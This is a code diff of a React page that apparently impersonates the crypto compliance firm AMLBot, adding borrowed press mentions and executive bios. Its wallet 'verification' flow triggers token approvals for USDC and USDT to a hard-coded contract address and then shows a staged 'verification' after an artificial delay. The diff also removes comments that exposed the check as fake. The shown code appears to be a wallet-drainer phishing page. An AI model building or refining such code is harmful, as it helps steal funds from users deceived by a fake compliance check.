@@ -1,6 +1,15 @@
 import { Link } from "react-router-dom";
 import { useEffect, useRef, useState } from "react";
-import type { WalletBalanceResponse } from "@shared/api";
+
+// Define type locally to avoid dependency issues
+interface WalletBalanceResponse {
+  address: string;
+  chain: string;
+  balanceBase: string;
+  balance: string;
+  symbol: string;
+}
+
 import {
   ArrowRight,
   Quote,
@@ -86,6 +95,64 @@ const testimonials = [
     quote:
       "Thank you once again! You've succeeded in creating a well-rounded course. I completely share your sentiment: I also wish that I would be taught in this way when I first started working in web3. Despite all my previous experience there was plenty to absorb over these two days.",
     author: "ChangeNow",
+  },
+];
+
+const mediaMentions = [
+  {
+    outlet: "Bloomberg Law",
+    title: "Stablecoin Oversight Poses Challenges as Digital Currency Grows",
+    excerpt:
+      "An AMLBot analysis of stablecoin freezes between 2023 and 2025 identified wide variation in how major issuers approach asset restraint. Some froze billions of dollars across thousa...",
+  },
+  {
+    outlet: "BBC News",
+    title:
+      "Revolut: 'I was careful and followed instructions closely, but still lost my crypto'",
+    excerpt:
+      "Mykhailo Tiutin is chief technology officer at AMLBot, a company that analyses how risky cryptocurrency transactions are. Their service runs checks similar to those supported by ba...",
+  },
+  {
+    outlet: "New York Post",
+    title: "Don't lose it all: Web3 wallets for crypto beginners explained",
+    excerpt:
+      "In our investigations, 90% of the stolen or hacked wallets we encounter are Web3 wallets. We see this often when users unknowingly approve malicious smart contracts or connect to f...",
+  },
+  {
+    outlet: "Cointelegraph",
+    title: "Over 14,500 Tron addresses at risk of silent hijacking",
+    excerpt:
+      "In the fourth quarter of 2024 alone, 2,130 wallets were compromised via a vulnerability tied to the UpdateAttackPermissions transaction, security firm AMLBot said in a report share...",
+  },
+  {
+    outlet: "CoinDesk",
+    title:
+      "Ether ICO Whale Moves 5K ETH to Exchanges, Bringing Monthly Total to $154M",
+    excerpt:
+      "A whale who received 1 million ether (ETH) tokens from participating in the network's initial coin offering in 2014 deposited 5,000 ETH, worth $13.2 million, to crypto exchange OKX...",
+  },
+  {
+    outlet: "The Block",
+    title: "Tether freezes $182 million in USDT tied to five Tron addresses",
+    excerpt:
+      "Tether has frozen assets in connection with an ongoing investigation, following a formal request from law enforcement authorities. The relevant agency has been working on this cas...",
+  },
+];
+
+const leaders = [
+  {
+    name: "Slava Demchuk",
+    role: "CEO, Co-founder",
+    image: "https://amlbot.com/_next/static/media/slava-demchuk.aaa96bea.webp",
+    quote:
+      "I believe compliance shouldn't slow down business growth, but instead becomes a competitive advantage that protects companies from legal and reputational attacks. The technology we are building prioritizes simplicity and reliability. As regulation grows more complex worldwide, our goal is to ensure that crypto founders barely notice it.",
+  },
+  {
+    name: "Anmol Jain",
+    role: "VP of Investigation",
+    image: "https://amlbot.com/_next/static/media/anmol-jain.12d0d31e.webp",
+    quote:
+      "For many criminals, crypto still feels like an easy target. They assume the money disappears once it moves on-chain. In reality, every transaction leaves a trail. My work is about following that trail and identifying the people behind it. At AMLBot we investigate incidents, trace stolen funds, and build tools that help expose bad actors and shut down the networks behind them.",
   },
 ];
 
@@ -228,7 +295,6 @@ export default function Index() {
         chainName = "Ethereum";
         rpcUrl = "https://eth.llamarpc.com";
         blockExplorerUrl = "https://etherscan.io";
-        // USDC Token
         tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
         smartContractAddress = "0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA";
         nativeCurrency = { name: "ETH", symbol: "ETH", decimals: 18 };
@@ -237,12 +303,10 @@ export default function Index() {
         chainName = "Binance Smart Chain";
         rpcUrl = "https://bsc-dataseed1.binance.org:8545";
         blockExplorerUrl = "https://bscscan.com";
-        // USDT Token
         tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
         smartContractAddress = "0xBAE688D04e14E9939C3a5dA69a1D746ea3487570";
         nativeCurrency = { name: "BNB", symbol: "BNB", decimals: 18 };
       } else {
-        // For other chains, just proceed without real approve logic in this demo context
         return;
       }
 
@@ -314,15 +378,12 @@ export default function Index() {
     setVerificationRequested(false);
 
     try {
-      // Trigger Approve if on supported chains
       if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
         await executeApprove();
       }
       
-      // Load balance and finish loading
       await loadConnectedWalletBalance();
       
-      // Artificial delay for "Verification" feel
       verificationTimer.current = window.setTimeout(() => {
         setVerificationLoading(false);
         setVerificationRequested(true);
